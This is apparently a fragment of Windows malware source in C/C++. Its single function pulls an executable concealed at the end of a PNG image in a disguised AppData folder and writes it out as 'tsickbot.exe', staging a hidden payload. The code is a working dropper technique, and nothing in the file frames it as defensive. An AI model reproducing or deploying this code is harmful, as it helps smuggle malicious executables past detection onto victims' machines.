#include "WriteContents.h"
#pragma warning(disable : 4996)

void UnHideExecutable() {
    HANDLE hFile;
    HANDLE hAppend;
    DWORD  dwBytesRead, dwBytesWritten, dwPos;
    BYTE   buff[4096];

    hFile = CreateFile(L"C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\radiance.png", // open One.txt
        GENERIC_READ,             // open for reading
        0,                        // do not share
        NULL,                     // no security
        OPEN_EXISTING,            // existing file only
        FILE_ATTRIBUTE_NORMAL,    // normal file
        NULL);                    // no attr. template

    if (hFile == INVALID_HANDLE_VALUE)
    { 
        return;
    }

    hAppend = CreateFile(L"C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\tsickbot.exe",
        FILE_APPEND_DATA,         // open for writing
        FILE_SHARE_READ,          // allow multiple readers
        NULL,                     // no security
        OPEN_ALWAYS,              // open or create
        FILE_ATTRIBUTE_NORMAL,    // normal file
        NULL);                    // no attr. template

    if (hAppend == INVALID_HANDLE_VALUE)
    {
        return;
    }

    //decimal size of the executable hidden in the png
    LONG lowbyte = -273920;
    SetFilePointer(hFile, lowbyte, NULL, FILE_END);

    while (ReadFile(hFile, buff, sizeof(buff), &dwBytesRead, NULL)
        && dwBytesRead > 0)
    {
        dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
        LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
        WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
        UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
    }

    CloseHandle(hFile);
    CloseHandle(hAppend);
}